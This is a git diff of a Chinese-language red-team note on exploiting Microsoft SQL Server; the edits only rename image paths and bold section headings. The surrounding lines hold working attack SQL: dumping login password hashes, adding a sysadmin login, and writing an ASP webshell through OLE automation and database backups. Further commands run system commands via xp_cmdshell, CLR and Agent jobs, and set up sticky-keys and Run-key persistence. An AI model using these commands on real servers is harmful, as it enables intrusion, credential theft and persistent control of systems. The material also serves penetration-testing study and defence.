@@ -90,7 +90,7 @@ sp_addsrvrolemember 'f0x', 'sysadmin'
 select sp.name as login, sp.type_desc as login_type, sl.password_hash, sp.create_date, sp.modify_date, case when sp.is_disabled = 1 then 'Disabled' else 'Enabled' end as status from sys.server_principals sp left join sys.sql_logins sl on sp.principal_id = sl.principal_id where sp.type not in ('G', 'R') order by sp.name;
 ```
 
-![](../../../../../assets/img/Security/RedTeam/软件服务安全/CS-Exploits/MSSQL/29.png)
+![](../../../../../assets/img/Security/RedTeam/软件服务安全/实验/MSSQL/29.png)
 
 ## 常见存储过程
 
@@ -110,11 +110,11 @@ exec xp_dirtree 'c:',1,1
 exec xp_dirtree 'c:'
 ```
 
-![](../../../../../assets/img/Security/RedTeam/软件服务安全/CS-Exploits/MSSQL/18.png)
+![](../../../../../assets/img/Security/RedTeam/软件服务安全/实验/MSSQL/18.png)
 
-![](../../../../../assets/img/Security/RedTeam/软件服务安全/CS-Exploits/MSSQL/19.png)
+![](../../../../../assets/img/Security/RedTeam/软件服务安全/实验/MSSQL/19.png)
 
-![](../../../../../assets/img/Security/RedTeam/软件服务安全/CS-Exploits/MSSQL/20.png)
+![](../../../../../assets/img/Security/RedTeam/软件服务安全/实验/MSSQL/20.png)
 
 xp_dirtree 还可以用来触发 NTLM 请求
 ```sql
@@ -131,7 +131,7 @@ xp_subdirs 用于得到给定的文件夹内的文件夹列表
 exec xp_subdirs "C:\\"
 ```
 
-![](../../../../../assets/img/Security/RedTeam/软件服务安全/CS-Exploits/MSSQL/21.png)
+![](../../../../../assets/img/Security/RedTeam/软件服务安全/实验/MSSQL/21.png)
 
 **xp_fixeddrives**
 
@@ -142,7 +142,7 @@ xp_fixeddrives 用于查看磁盘驱动器剩余（free）的空间
 EXEC xp_fixeddrives
 ```
 
-![](../../../../../assets/img/Security/RedTeam/软件服务安全/CS-Exploits/MSSQL/22.png)
+![](../../../../../assets/img/Security/RedTeam/软件服务安全/实验/MSSQL/22.png)
 
 **xp_availablemedia**
 
@@ -153,7 +153,7 @@ xp_availablemedia 用于获得当前所有驱动器
 EXEC xp_availablemedia
 ```
 
-![](../../../../../assets/img/Security/RedTeam/软件服务安全/CS-Exploits/MSSQL/23.png)
+![](../../../../../assets/img/Security/RedTeam/软件服务安全/实验/MSSQL/23.png)
 
 **xp_fileexist**
 
@@ -198,7 +198,7 @@ xp_regenumkeys 可以查看指定的注册表
 exec xp_regenumkeys 'HKEY_CURRENT_USER','Control Panel\International'
 ```
 
-![](../../../../../assets/img/Security/RedTeam/软件服务安全/CS-Exploits/MSSQL/24.png)
+![](../../../../../assets/img/Security/RedTeam/软件服务安全/实验/MSSQL/24.png)
 
 **xp_regdeletekey**
 
@@ -211,11 +211,11 @@ EXEC xp_regdeletekey 'HKEY_LOCAL_MACHINE','SOFTWARE\Microsoft\Windows NT\Current
 
 ## 存储过程写webshell
 
-利用条件
+**利用条件**
 - 拥有DBA权限
 - 知道的网站绝对路径
 
-找绝对路径的方法
+**找绝对路径的方法**
 - 报错信息
 - 配置文件
     - iis6 : C:\Windows\system32\inetsrv\metabase.xml
@@ -226,6 +226,8 @@ EXEC xp_regdeletekey 'HKEY_LOCAL_MACHINE','SOFTWARE\Microsoft\Windows NT\Current
 - xp_subdirs
 - 修改404页面
 - 爆破路径
+
+**利用方法**
 
 ```sql
 -- 判断当前是否为DBA权限，为1则可以提权
@@ -238,9 +240,9 @@ exec sp_oamethod @o, 'createtextfile', @f out, 'C:\www\test.asp', 1
 exec @ret = sp_oamethod @f, 'writeline', NULL,'<%execute(request("a"))%>'
 ```
 
-![](../../../../../assets/img/Security/RedTeam/软件服务安全/CS-Exploits/MSSQL/25.png)
+![](../../../../../assets/img/Security/RedTeam/软件服务安全/实验/MSSQL/25.png)
 
-![](../../../../../assets/img/Security/RedTeam/软件服务安全/CS-Exploits/MSSQL/26.png)
+![](../../../../../assets/img/Security/RedTeam/软件服务安全/实验/MSSQL/26.png)
 
 **修改404页面**
 
@@ -265,12 +267,14 @@ exec sp_oamethod @o, 'copyfile',null,'C:\Windows\System32\inetsrv\config\applica
 
 ## 差异备份写webshell
 
-**描述**
+**漏洞描述**
 
 在 sql server 里 dbo 和 sa 权限都有备份数据库权限，我们可以把数据库备份成 asp 文件，获得 webshell
 
-利用条件
+**利用条件**
 - 需要知道绝对路径，路径可写
+
+**利用方法**
 
 ```sql
 -- 生成备份文件,注意库名和路径
@@ -292,15 +296,17 @@ backup database test to disk='C:\www\shell.asp' WITH DIFFERENTIAL,FORMAT;
 
 ## 日志备份写webshell
 
-优势：
+**优势**
 - 重复性好，多次备份的成功率高
 - 相对于差异备份而言，shell 的体积较小
 
-利用条件：
+**利用条件**
 - 拥有 DBA 权限
 - 知道网站绝对路径，并且可写
 - 站库不分离
 - 数据库必须被备份过一次
+
+**利用方法**
 
 ```sql
 -- 判断当前是否为DBA权限，为1则可以提权
@@ -317,6 +323,7 @@ backup log 库名 to disk = 'c:\www\2.asp'
 ## sp_addextendedproc
 
 sp_addextendedproc 可以利用于恢复组件
+
 ```sql
 EXEC sp_addextendedproc xp_cmdshell ,@dllname ='xplog70.dll'
 EXEC sp_addextendedproc xp_enumgroups ,@dllname ='xplog70.dll'
@@ -343,11 +350,11 @@ EXEC sp_addextendedproc xp_fixeddrives ,@dllname ='xpstar.dll'
 
 ## xp_cmdshell
 
-**描述**
+**漏洞描述**
 
 xp_cmdshell 是 Sql Server 中的一个组件，我们可以用它来执行系统命令。
 
-利用条件
+**利用条件**
 - 拥有 DBA 权限, 在 2005 中 xp_cmdshell 的权限是 system，2008 中是 network。
 - 依赖 xplog70.dll
 
@@ -378,7 +385,7 @@ CREATE TABLE cmdtmp (dir varchar(8000));
 insert into cmdtmp(dir) exec master..xp_cmdshell 'for /r c:\ %i in (1*.aspx) do @echo %i'
 ```
 
-![](../../../../../assets/img/Security/RedTeam/软件服务安全/CS-Exploits/MSSQL/27.png)
+![](../../../../../assets/img/Security/RedTeam/软件服务安全/实验/MSSQL/27.png)
 
 **无会显,也无法进行 dnslog 怎么办**
 
@@ -389,7 +396,7 @@ insert into tmpTable(tmp1) exec master..xp_cmdshell 'ipconfig'
 select * from tmpTable
 ```
 
-![](../../../../../assets/img/Security/RedTeam/软件服务安全/CS-Exploits/MSSQL/28.png)
+![](../../../../../assets/img/Security/RedTeam/软件服务安全/实验/MSSQL/28.png)
 
 **常见报错**
 
@@ -433,7 +440,7 @@ Exec master.dbo.sp_addextendedproc 'xp_cmdshell','D:\\xplog70.dll'
 
 ## sp_oacreate (Ole Automation Procedures)
 
-利用条件
+**利用条件**
 - 拥有DBA权限
 - 依赖 odsole70.dll
 
@@ -469,7 +476,7 @@ exec sp_oacreate 'wscript.shell',@ffffffff0x output
 exec sp_oamethod @ffffffff0x,'run',null,'c:\windows\system32\cmd.exe /c whoami >c:\\www\\1.txt'
 ```
 
-![](../../../../../assets/img/Security/RedTeam/软件服务安全/CS-Exploits/MSSQL/12.png)
+![](../../../../../assets/img/Security/RedTeam/软件服务安全/实验/MSSQL/12.png)
 
 **利用 com 组件执行命令**
 ```sql
@@ -481,7 +488,7 @@ exec sp_oamethod @text, 'readall', @str out
 select @str;
 ```
 
-![](../../../../../assets/img/Security/RedTeam/软件服务安全/CS-Exploits/MSSQL/14.png)
+![](../../../../../assets/img/Security/RedTeam/软件服务安全/实验/MSSQL/14.png)
 
 **利用 com 组件写文件**
 ```sql
@@ -495,7 +502,7 @@ EXEC sp_oamethod @ObjectToken, 'Close';
 EXEC sp_OADestroy @ObjectToken;
 ```
 
-![](../../../../../assets/img/Security/RedTeam/软件服务安全/CS-Exploits/MSSQL/13.png)
+![](../../../../../assets/img/Security/RedTeam/软件服务安全/实验/MSSQL/13.png)
 
 **filesystemobject COM 对象利用**
 
@@ -514,9 +521,9 @@ DECLARE @s int EXEC sp_oacreate [wscript.shell], @s out
 EXEC sp_oamethod @s,[run],NULL,[c:\\www\\ffffffff0x.vbs]
 ```
 
-![](../../../../../assets/img/Security/RedTeam/软件服务安全/CS-Exploits/MSSQL/15.png)
+![](../../../../../assets/img/Security/RedTeam/软件服务安全/实验/MSSQL/15.png)
 
-![](../../../../../assets/img/Security/RedTeam/软件服务安全/CS-Exploits/MSSQL/16.png)
+![](../../../../../assets/img/Security/RedTeam/软件服务安全/实验/MSSQL/16.png)
 
 ```sql
 -- 复制具有不同名称和位置的 calc.exe 可执行文件
@@ -525,7 +532,7 @@ exec sp_oacreate 'scripting.filesystemobject', @ffffffff0x out;
 exec sp_oamethod @ffffffff0x,'copyfile',null,'c:\\windows\\system32\calc.exe','c:\\windows\\system32\calc_copy.exe';
 ```
 
-![](../../../../../assets/img/Security/RedTeam/软件服务安全/CS-Exploits/MSSQL/8.webp)
+![](../../../../../assets/img/Security/RedTeam/软件服务安全/实验/MSSQL/8.webp)
 
 ```sql
 -- 移动文件
@@ -607,7 +614,7 @@ EXEC sp_OAMethod @objPermiss,'SetSecurityDescriptor',@objRet output,@objFull;
 
 ## xp_regwrite
 
-利用条件
+**利用条件**
 - xpstar.dll
 
 **修改注册表来劫持粘贴键(映像劫持)**
@@ -620,7 +627,7 @@ exec master..xp_regwrite @rootkey='HKEY_LOCAL_MACHINE',@key='SOFTWARE\Microsoft\
 exec master..xp_regread 'HKEY_LOCAL_MACHINE','SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe','Debugger'
 ```
 
-![](../../../../../assets/img/Security/RedTeam/软件服务安全/CS-Exploits/MSSQL/17.png)
+![](../../../../../assets/img/Security/RedTeam/软件服务安全/实验/MSSQL/17.png)
 
 **将 COM 对象注册到 CLSID**
 
@@ -652,9 +659,9 @@ N'1.0';
 EXEC master..xp_regwrite 'HKEY_LOCAL_MACHINE','SOFTWARE\Microsoft\Command Processor','Autorun','REG_SZ','c:\windows\system32\calc.exe'
 ```
 
-![](../../../../../assets/img/Security/RedTeam/软件服务安全/CS-Exploits/MSSQL/2.webp)
+![](../../../../../assets/img/Security/RedTeam/软件服务安全/实验/MSSQL/2.webp)
 
-![](../../../../../assets/img/Security/RedTeam/软件服务安全/CS-Exploits/MSSQL/3.webp)
+![](../../../../../assets/img/Security/RedTeam/软件服务安全/实验/MSSQL/3.webp)
 
 **Run & RunOnce**
 
@@ -664,11 +671,11 @@ Run 和 RunOnce 注册表项会导致程序在用户每次登录时运行。
 EXEC master.dbo.xp_regwrite 'HKEY_LOCAL_MACHINE','SOFTWARE\Microsoft\Windows\CurrentVersion\Run','Aut3','REG_SZ','c:\windows\system32\calc.exe'
 ```
 
-![](../../../../../assets/img/Security/RedTeam/软件服务安全/CS-Exploits/MSSQL/9.webp)
+![](../../../../../assets/img/Security/RedTeam/软件服务安全/实验/MSSQL/9.webp)
 
 注销，重新登录,触发 calc
 
-![](../../../../../assets/img/Security/RedTeam/软件服务安全/CS-Exploits/MSSQL/10.webp)
+![](../../../../../assets/img/Security/RedTeam/软件服务安全/实验/MSSQL/10.webp)
 
 **禁用指定软件**
 
@@ -679,20 +686,21 @@ EXEC master.dbo.xp_regwrite 'HKEY_LOCAL_MACHINE','SOFTWARE\Microsoft\Windows\Cur
 EXEC master.dbo.xp_regwrite 'HKEY_LOCAL_MACHINE','SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\Everything.exe','Debugger','REG_SZ','taskkill.exe'
 ```
 
-![](../../../../../assets/img/Security/RedTeam/软件服务安全/CS-Exploits/MSSQL/11.webp)
+![](../../../../../assets/img/Security/RedTeam/软件服务安全/实验/MSSQL/11.webp)
 
 此时只要开启 Everything 就会自动关闭.
 
 ## SQL Server Agent Job 代理执行计划任务利用
 
-**描述**
+**漏洞描述**
 
 SQL Server 代理是一项 Microsoft Windows 服务，它执行计划的管理任务，这些任务在 SQL Server 中称为作业。
 
-利用条件
+**利用条件**
 - 拥有 DBA 权限
 - 需要 sqlserver 代理 (sqlagent) 开启，Express 版本Sql Server 是无法启用的
 
+**利用方法**
 ```sql
 -- 开启 sqlagent 服务
 exec master.dbo.xp_servicecontrol 'start','SQLSERVERAGENT';
@@ -710,7 +718,7 @@ exec sp_start_job 'test';
 
 ## CLR提权
 
-**描述**
+**漏洞描述**
 
 从 SQL Server 2005 (9.x) 开始，SQL Server 集成了用于 Microsoft Windows 的 .NET Framework 的公共语言运行时 (CLR) 组件。 这意味着现在可以使用任何 .NET Framework 语言（包括 Microsoft Visual Basic .NET 和 Microsoft Visual C#）来编写存储过程、触发器、用户定义类型、用户定义函数、用户定义聚合和流式表值函数。
 - https://docs.microsoft.com/zh-cn/sql/relational-databases/clr-integration/common-language-runtime-clr-integration-programming-concepts?view=sql-server-ver15
@@ -721,8 +729,10 @@ CLR 方式可以利用 16 进制文件流方式导入 DLL 文件，不需要文�
 dll的制作可以参考下面的文章
 - https://xz.aliyun.com/t/10955#toc-12
 
-利用条件
+**利用条件**
 - 拥有DBA权限
+
+**复现测试**
 
 ```sql
 -- 启用CLR,SQL Server 2017版本之前
@@ -756,7 +766,7 @@ go
 exec dbo.ExecCommand "whoami /all";
 ```
 
-![](../../../../../assets/img/Security/RedTeam/软件服务安全/CS-Exploits/MSSQL/7.png)
+![](../../../../../assets/img/Security/RedTeam/软件服务安全/实验/MSSQL/7.png)
 
 格式简化
 ```sql
@@ -805,26 +815,24 @@ UPDATE user SET id = '22' WHERE nickname = 'f0x'
 
 实际测试，可以看到执行命令卡住了,一直没有结束
 
-![](../../../../../assets/img/Security/RedTeam/软件服务安全/CS-Exploits/MSSQL/4.png)
+![](../../../../../assets/img/Security/RedTeam/软件服务安全/实验/MSSQL/4.png)
 
 查看任务管理器，calc 运行了
 
-![](../../../../../assets/img/Security/RedTeam/软件服务安全/CS-Exploits/MSSQL/5.png)
+![](../../../../../assets/img/Security/RedTeam/软件服务安全/实验/MSSQL/5.png)
 
 手动将 calc 结束,此时语句执行完毕返回结果，执行时间等于 calc 运行的时间
 
-![](../../../../../assets/img/Security/RedTeam/软件服务安全/CS-Exploits/MSSQL/6.png)
+![](../../../../../assets/img/Security/RedTeam/软件服务安全/实验/MSSQL/6.png)
 
 ## SQL Server R 和 Python 的利用
 
-**描述**
+**漏洞描述**
 
 在 SQL Server 2017 及更高版本中，R 与 Python 一起随附在机器学习服务中。该服务允许通过 SQL Server 中 sp_execute_external_script 执行 Python 和 R 脚本
 
-利用条件：
-- Machine Learning Services 必须要在 Python 安装过程中选择
-
-必须启用外部脚本
+**利用条件**
+- Machine Learning Services 必须要在 Python 安装过程中选择必须启用外部脚本
 - EXEC sp_configure 'external scripts enabled', 1
 - RECONFIGURE WITH OVERRIDE
 - 重新启动数据库服务器
@@ -870,14 +878,18 @@ WITH RESULT SETS (([cmd_out] nvarchar(max)))
 
 ## AD Hoc 分布式查询 & Microsoft OLE DB Provider for Microsoft Jet (沙盒提权)
 
+**漏洞描述**
+
 AD Hoc 分布式查询允许从多个异构数据源（例如 SQL Server 的多个实例）访问数据。这些数据源可以存储在相同或不同的计算机上。启用临时访问后，登录到该实例的任何用户都可以使用 OLE DB 提供程序通过 OPENROWSET 或 OPENDATASOURCE 函数执行引用网络上任何数据源的 SQL 语句。
 
 攻击者滥用 Ad Hoc 分布式查询和 Microsoft OLE DB Provider for Microsoft Jet 来创建和执行旨在从远程服务器下载恶意可执行文件的脚本。
 
-利用条件
+**利用条件**
 - 拥有 DBA 权限
 - sqlserver 服务权限为 system
 - 服务器拥有 jet.oledb.4.0 驱动
+
+**利用方法**
 
 ```sql
 -- 修改注册表，关闭沙盒模式
